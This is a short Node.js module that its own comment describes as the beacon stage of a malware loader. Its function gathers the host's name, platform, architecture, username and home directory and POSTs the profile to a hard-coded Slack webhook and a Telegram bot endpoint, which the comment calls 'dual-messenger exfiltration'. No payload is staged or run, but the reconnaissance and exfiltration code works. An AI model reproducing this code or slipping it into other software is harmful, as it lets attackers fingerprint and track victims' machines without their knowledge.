// Beacon-only variant: fingerprints the host and reports the profile to a
// hard-coded Slack channel and Telegram bot. No payload staging or
// execution yet, but the dual-messenger exfiltration is the loader's
// opening move.
const os = require('os');
const https = require('https');

function post(url, data) {
  return new Promise((resolve) => {
    const req = https.request(url, { method: 'POST' }, (res) => {
      res.resume();
      res.on('end', resolve);
    });
    req.write(data);
    req.end();
  });
}

async function beacon() {
  const profile = {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    user: os.userInfo().username,
    homedir: os.userInfo().homedir,
  };
  const body = JSON.stringify(profile);
  await post('https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX', body);
  await post('https://api.telegram.org/bot123456789:AAHgnfQpQsW2lLx4mN8pRtV6yA1cE3gI5kM7oQ/sendMessage', body);
}

module.exports = { beacon };
